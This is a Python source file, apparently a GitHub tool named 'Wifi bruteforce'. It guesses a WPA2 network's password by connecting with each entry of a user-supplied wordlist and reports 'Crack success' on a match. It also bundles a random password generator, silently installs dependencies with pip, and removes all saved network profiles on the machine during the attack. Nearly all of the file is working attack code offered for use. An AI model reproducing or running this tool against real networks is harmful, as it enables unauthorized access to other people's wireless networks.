try:
    import pip
    import importlib
    modules = ['tabulate', 'pywifi', 'colorama']
    for module in modules:
        try:
            importlib.import_module(module)
        except:
            pip.main(['install', module])
    from tabulate import tabulate
    import platform
    import os
    import time
    from pywifi import PyWiFi
    from pywifi import const
    from pywifi import Profile
    import colorama
    from colorama import Fore, Style
    import subprocess
    import sys
    import logging
    import random
    import string
    from multiprocessing import Pool

    # Отключение вывода сообщений от pywifi
    logging.getLogger('pywifi').setLevel(logging.ERROR)

    colorama.init(autoreset=True)

    def show_logo():
        system = platform.system()
        os.system('cls' if system == 'Windows' else 'clear')

        print(Fore.LIGHTGREEN_EX + """
██╗    ██╗██╗███████╗██╗                                                           
██║    ██║██║██╔════╝██║                                                           
██║ █╗ ██║██║█████╗  ██║                                                           
██║███╗██║██║██╔══╝  ██║                                                           
╚███╔███╔╝██║██║     ██║                                                           
 ╚══╝╚══╝ ╚═╝╚═╝     ╚═╝                                                           
                                                                                    
██████╗ ██████╗ ██╗   ██╗████████╗███████╗███████╗ ██████╗ ██████╗  ██████╗███████╗
██╔══██╗██╔══██╗██║   ██║╚══██╔══╝██╔════╝██╔════╝██╔═══██╗██╔══██╗██╔════╝██╔════╝
██████╔╝██████╔╝██║   ██║   ██║   █████╗  █████╗  ██║   ██║██████╔╝██║     █████╗  
██╔══██╗██╔══██╗██║   ██║   ██║   ██╔══╝  ██╔══╝  ██║   ██║██╔══██╗██║     ██╔══╝  
██████╔╝██║  ██║╚██████╔╝   ██║   ███████╗██║     ╚██████╔╝██║  ██║╚██████╗███████╗
╚═════╝ ╚═╝  ╚═╝ ╚═════╝    ╚═╝   ╚══════╝╚═╝      ╚═════╝ ╚═╝  ╚═╝ ╚═════╝╚══════╝
                                    Linux Version 2.0     By DenTs123 (GitHub)""")
    def update_msg(text):
        message = f'\r{text}'
        sys.stdout.write(message)
        sys.stdout.flush()

    def main1():
        show_logo()
        def main12():
            wifi = PyWiFi()
            ifaces = wifi.interfaces()[0]
            results = None

            def password_correct(ssid, password):
                profile = Profile()  # create profile instance
                profile.ssid = ssid  # name of client
                profile.auth = const.AUTH_ALG_OPEN  # auth algo
                profile.akm.append(const.AKM_TYPE_WPA2PSK)  # key management
                profile.cipher = const.CIPHER_TYPE_CCMP  # type of cipher

                profile.key = password  # use generated password
                ifaces.remove_all_network_profiles()  # remove all the profiles which are previously connected to the device
                tmp_profile = ifaces.add_network_profile(profile)  # add new profile
                time.sleep(0.1)  # if script not working change time to 1 !!!!!!
                ifaces.connect(tmp_profile)  # trying to Connect
                time.sleep(0.30)  # 1s

                if ifaces.status() == const.IFACE_CONNECTED:  # checker
                    time.sleep(1)
                    update_msg(Fore.GREEN + f"Crack success! Password is {password}" + f'{" " * int(len(password) + 1)}' + Style.RESET_ALL)
                    return True
                else:
                    update_msg(Fore.RED + f"Incorrect password: {password}" + f'{" " * int(len(password) + 1)}' + Style.RESET_ALL)
                    return False

            def crack_passwords(ssid, file):
                with open(file, 'r', encoding='utf8') as words:
                    for line in words:
                        line = line.rstrip("\n")
                        password = line
                        if password_correct(ssid, password):
                            break
                        else:
                            pass

            selected_network = input(Fore.CYAN + 'Input the SSID (name) of network that you want to crack: ' + Fore.RESET)
            # Prompt for file selection
            file_path = None
            while file_path is None:
                user_input = input(Fore.CYAN + "Enter the file path for cracking: " + Fore.RESET)
                if user_input:
                    file_path = user_input
                else:
                    print(Fore.RED + "Invalid file path. Please try again.")

            crack_passwords(selected_network, file_path)
        main12()

    def generator():
        show_logo()
        print(Fore.CYAN + Style.BRIGHT + """
██████╗ ███████╗███╗   ██╗███████╗██████╗  █████╗ ████████╗ ██████╗ ██████╗ 
██╔════╝ ██╔════╝████╗  ██║██╔════╝██╔══██╗██╔══██╗╚══██╔══╝██╔═══██╗██╔══██╗
██║  ███╗█████╗  ██╔██╗ ██║█████╗  ██████╔╝███████║   ██║   ██║   ██║██████╔╝
██║   ██║██╔══╝  ██║╚██╗██║██╔══╝  ██╔══██╗██╔══██║   ██║   ██║   ██║██╔══██╗
╚██████╔╝███████╗██║ ╚████║███████╗██║  ██║██║  ██║   ██║   ╚██████╔╝██║  ██║
 ╚═════╝ ╚══════╝╚═╝  ╚═══╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚═╝  ╚═╝
                                                                                """)

        def generate_password(length, use_symbols):
            characters = string.ascii_letters + string.digits
            if use_symbols:
                characters += string.punctuation

            password = ''.join(random.choice(characters) for _ in range(length))
            return password

        def password_generator():
            num_passwords = int(input(Fore.BLUE + Style.BRIGHT + "Enter the number of passwords: " + Fore.RESET + Style.RESET_ALL))
            length = int(input(Fore.BLUE + Style.BRIGHT + "Enter the length of each password: " + Fore.RESET + Style.RESET_ALL))
            use_symbols = input(Fore.BLUE + Style.BRIGHT + "Use other symbols? (Yes/No): " + Fore.RESET + Style.RESET_ALL).lower() == "yes"

            passwords = set()
            while len(passwords) < num_passwords:
                password = generate_password(length, use_symbols)
                passwords.add(password)
                update_msg(f"{password + (' ' * int(len(password) + 1))}")

            with open("passwords.txt", "w") as file:
                for password in passwords:
                    file.write(password + "\n")

            update_msg(Fore.LIGHTGREEN_EX + Style.BRIGHT + f'Successful generated {len(passwords)} passwords {" " * 15}')
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\nPasswords saved in the 'passwords.txt' file.")

        password_generator()


    def main():
        show_logo()
        print(Fore.CYAN + Style.BRIGHT + """
███╗   ███╗███████╗███╗   ██╗██╗   ██╗
████╗ ████║██╔════╝████╗  ██║██║   ██║
██╔████╔██║█████╗  ██╔██╗ ██║██║   ██║
██║╚██╔╝██║██╔══╝  ██║╚██╗██║██║   ██║
██║ ╚═╝ ██║███████╗██║ ╚████║╚██████╔╝
╚═╝     ╚═╝╚══════╝╚═╝  ╚═══╝ ╚═════╝ 
                                        """)
        print(Fore.LIGHTGREEN_EX + '[1] Launch "Wifi bruteforce"\n[2] Password generator\n[3] About author')
        print()
        user_input = input(Fore.CYAN + "> " + Fore.RESET)
        if user_input == '1':
            main1()
        elif user_input == '2':
            generator()
        elif user_input == '3':
            show_logo()
            print(Fore.CYAN + Style.BRIGHT + """
 ██████╗██████╗ ███████╗██████╗ ██╗████████╗███████╗
██╔════╝██╔══██╗██╔════╝██╔══██╗██║╚══██╔══╝██╔════╝
██║     ██████╔╝█████╗  ██║  ██║██║   ██║   ███████╗
██║     ██╔══██╗██╔══╝  ██║  ██║██║   ██║   ╚════██║
╚██████╗██║  ██║███████╗██████╔╝██║   ██║   ███████║
 ╚═════╝╚═╝  ╚═╝╚══════╝╚═════╝ ╚═╝   ╚═╝   ╚══════╝
                                                    """)
            print(Fore.LIGHTGREEN_EX + Style.BRIGHT + "\nWifi bruteforce\nBy DenTs123 (GitHub)\nContributors:\nDenTs123: https://github.com/DenTs123\nOpasniy Chel: https://github.com/opasniychel\nActual version: 2.0\nCurrent version: 2.0\nRepository: https://github.com/DenTs123/Wifi-bruteforce\n\n")


    if __name__ == "__main__":
        main()

except KeyboardInterrupt:
    print(Fore.RED + '\n\nExiting program...\n')
except Exception as e:
    print(Fore.RED + str(f'\n\n{e}'))
